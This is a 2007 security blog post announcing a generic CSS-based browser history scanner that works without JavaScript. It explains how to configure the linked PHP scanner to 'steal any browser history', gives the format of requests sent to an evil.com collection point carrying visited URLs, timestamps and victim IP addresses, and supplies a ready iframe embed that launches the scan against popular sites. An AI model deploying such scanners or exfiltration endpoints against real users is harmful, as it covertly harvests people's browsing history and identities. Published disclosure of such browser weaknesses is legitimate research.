---
title: Noscript HScan
author: petko-d-petkov
date: Wed, 28 Feb 2007 22:57:00 GMT
template: post.jade
category: fucked
---

After releasing my Firefox specific [history scanner](/blog/hscan-redux/), RSnake came up with [his own](http://ha.ckers.org/blog/20070228/steal-browser-history-without-javascript) bleeding edge history scanning technique which is based on Jeremiah Grossman's [implementation](http://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html) but it does not require JavaScript. This approach has its own limitations and advantages.

On the advantages side, you don't really need JavaScript to steal the victim's browser history anymore. So, everybody who is thinking that turning off JavaScript is the safe way to go, you are most definitely wrong. You should turn CSS off too. This is it. Sparten browsing is the key. On the other hand, history scanning without JavaScript is less powerful in a way that attackers are not able to perform actions as soon as a history entry is discovered.

Still, I think that RSnake's approach is quite interesting and innovative. I decided to write a generic scanner that can be configured on the fly to steal any browser history. The scanner is located [here](/files/2007/02/noscript-hscan-php.txt). Before using it you need to pass several GET or POST (it is up to you really) parameters to the script like this:

	noscript-hscan.php?u1=[url]&u2=[url]&t=[target collection point]

The scanner excepts any number of URLs. The only rule is that every URL parameters must start with **u** (lower case u). It is a good practice to number the URLs that you want to scan as u1, u2, u3, etc. The **t** parameter is for the target collection point. This is the place where the history information will be sent to. The collection point will receive requests that look like the following:

	http://evil.com/path/to/collection/point?u=[url]&t=[timestamp]&c=[ip]

The easiest way you can launch the generated scanning code is to include it inside an iframe. For example you can use something like the following:

```html
<iframe src="noscript-hscan.php?t=http%3A//evil.com/path/to/collection/point%3F&u0=http%3A//www.yahoo.com/&u1=http%3A//www.google.com/&u2=http%3A//www.myspace.com/&u3=http%3A//www.msn.com/&u4=http%3A//www.ebay.com/&"></iframe>
```

_This is it! It is simple._
